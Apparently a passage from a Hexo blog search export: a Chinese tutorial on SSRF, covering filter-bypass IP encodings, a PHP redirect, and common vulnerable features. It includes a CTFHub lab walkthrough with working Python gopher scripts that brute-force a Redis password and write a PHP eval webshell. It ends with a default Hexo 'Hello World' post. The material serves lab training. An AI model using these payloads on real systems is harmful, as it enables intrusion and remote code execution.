class="hljs-attribute">16</span>进制格式：<span class="hljs-number">0</span>xC0.<span class="hljs-number">0</span>xA8.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">10</span>进制整数格式：<span class="hljs-number">3232235521</span><br><span class="hljs-attribute">16</span>进制整数格式：<span class="hljs-number">0</span>xC0A80001  <br></code></pre></td></tr></table></figure><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳<br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇<br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛<br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵<br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ<br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴<br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿  <br></code></pre></td></tr></table></figure><h3 id="urlencode"><a href="#urlencode" class="headerlink" title="urlencode"></a>urlencode</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br>data = <span class="hljs-string">&quot;www.target.com&quot;</span>;<br>alist = []<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data:<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x), <span class="hljs-number">2</span>):<br>alist.append((x[i:i+<span class="hljs-number">2</span>]).encode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;http://%&quot;</span>+<span class="hljs-string">&#x27;%&#x27;</span>.join(alist))<br></code></pre></td></tr></table></figure><h3 id="短网址"><a href="#短网址" class="headerlink" title="短网址"></a>短网址</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.985.so/</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.urlc.cn/  </span><br></code></pre></td></tr></table></figure><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>在vps上部署</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: http://192.168.1.10&quot;</span>);<br><span class="hljs-keyword">exit</span>();<br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><h2 id="六、SSRF漏洞点挖掘"><a href="#六、SSRF漏洞点挖掘" class="headerlink" title="六、SSRF漏洞点挖掘"></a>六、SSRF漏洞点挖掘</h2><ol><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li><li>图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</li><li>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</li></ol><p>关键字：Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</p><h2 id="七、漏洞利用复现"><a href="#七、漏洞利用复现" class="headerlink" title="七、漏洞利用复现"></a>七、漏洞利用复现</h2><h3 id="ssrf打redis"><a href="#ssrf打redis" class="headerlink" title="ssrf打redis"></a>ssrf打redis</h3><p>主要方法：</p><ol><li>爆破密码</li><li>写shell</li><li>写入ssh公钥</li><li>定时任务反弹shell</li><li>主从复制</li></ol><p>参考<a href="https://www.cnblogs.com/wjrblogs/p/14456190.html">https://www.cnblogs.com/wjrblogs/p/14456190.html</a></p><p>环境：CTFHUB-SSRF-Redis协议</p><p>漏洞点：<code>/?url=</code></p><p><img src="/../img/SSRF_img/clip_image002.gif" alt="img"></p><p>dict协议探测到6379端口开放</p><p><img src="/../img/SSRF_img/clip_image004.gif" alt="img"></p><p>尝试用gopher爆破密码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br>target = <span class="hljs-string">&quot;http://challenge-f6443f96c8918df3.sandbox.ctfhub.com:10800/?url=&quot;</span>  <span class="hljs-comment">#目标url</span><br>rhost = <span class="hljs-string">&quot;127.0.0.1&quot;</span>   <br>rport = <span class="hljs-string">&quot;6379&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;passwd.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    passwds = file.readlines()<br>    <span class="hljs-keyword">for</span> passwd <span class="hljs-keyword">in</span> passwds:<br>        passwd = passwd.strip(<span class="hljs-string">&quot;\n&quot;</span>)<br>        len_pass = <span class="hljs-built_in">len</span>(passwd)<br>        payload = <span class="hljs-string">r&quot;gopher://&quot;</span> + rhost + <span class="hljs-string">&quot;:&quot;</span> + rport + <span class="hljs-string">&quot;/_%252A2%250d%250a%25244%250d%250aAUTH%250d%250a%2524&quot;</span>+<span class="hljs-built_in">str</span>(len_pass)+<span class="hljs-string">r&quot;%250d%250a&quot;</span>+passwd+<span class="hljs-string">r&quot;%250D%250A%252A1%250D%250A&quot;</span><br>        url = target+<span class="hljs-built_in">str</span>(payload)<br>        text = requests.get(url).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;OK&quot;</span> <span class="hljs-keyword">in</span> text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 爆破成功 密码为: &quot;</span> + passwd)<br>            <span class="hljs-built_in">print</span>(text + payload)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>无果，写shell</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br>protocol=<span class="hljs-string">&quot;gopher://&quot;</span>  <span class="hljs-comment"># 使用的协议 </span><br>ip=<span class="hljs-string">&quot;127.0.0.1&quot;</span><br>port=<span class="hljs-string">&quot;6379&quot;</span>   <span class="hljs-comment"># 目标redis的端口号 </span><br>shell=<span class="hljs-string">&quot;\n\n&lt;?php @eval($_POST[&#x27;xxx&#x27;]);?&gt;\n\n&quot;</span><br>filename=<span class="hljs-string">&quot;shell.php&quot;</span>   <span class="hljs-comment"># shell的名字 </span><br>path=<span class="hljs-string">&quot;/var/www/html&quot;</span>      <span class="hljs-comment"># 写入的路径</span><br>passwd=<span class="hljs-string">&quot;&quot;</span>   <span class="hljs-comment"># 如果有密码 则填入</span><br><span class="hljs-comment"># 恶意命令 </span><br>cmd=[<span class="hljs-string">&quot;flushall&quot;</span>,<br>     <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br>     <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br>     <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br>     <span class="hljs-string">&quot;save&quot;</span><br>     ]<br><span class="hljs-keyword">if</span> passwd:<br>    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload=protocol+ip+<span class="hljs-string">&quot;:&quot;</span>+port+<span class="hljs-string">&quot;/_&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):<br>    CRLF=<span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd=<span class="hljs-string">&quot;&quot;</span><br>    cmd+=<span class="hljs-string">&quot;*&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd+=CRLF+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>    cmd+=CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>        payload += parse.quote(redis_format(x))<br>    <span class="hljs-built_in">print</span>(payload)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;二次url编码后的结果:\n&quot;</span> ,parse.quote(payload))<br><br></code></pre></td></tr></table></figure><p>生成gopher写shell的payload</p><p><img src="/../img/SSRF_img/clip_image006.gif" alt="img"></p><p>写马，执行，成功</p><p><img src="/../img/SSRF_img/clip_image008.gif" alt="img"></p><p>无法写入ssh公钥，原因：redis是www-data权限，写不进&#x2F;root</p><p>无法写入定时计划反弹shell，原因：没有crontab命令</p><h3 id="ssrf打mysql"><a href="#ssrf打mysql" class="headerlink" title="ssrf打mysql"></a>ssrf打mysql</h3><p>参考</p><p><a href="https://www.sqlsec.com/2021/12/bytectf2021.html">https://www.sqlsec.com/2021/12/bytectf2021.html</a></p><p><a href="https://blog.foxsuzuran.top/2023/07/14/%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%94%bb%e5%87%bbssrf%e9%9d%b6%e5%9c%babytectf2021-final-seo%e7%9a%84%e7%bb%8f%e8%bf%87/">https://blog.foxsuzuran.top/2023/07/14/%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%94%bb%e5%87%bbssrf%e9%9d%b6%e5%9c%babytectf2021-final-seo%e7%9a%84%e7%bb%8f%e8%bf%87/</a></p><p>ssrf dict探测到有3306。利用<a href="https://github.com/tarunkant/Gopherus">Gopherus</a>生成payload探测mysql有无密码</p><p>注意Gopherus无法直接生成udf的payload（会截断），需要改一下代码</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/10/09/hello-world/"/>
    <url>/2023/10/09/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
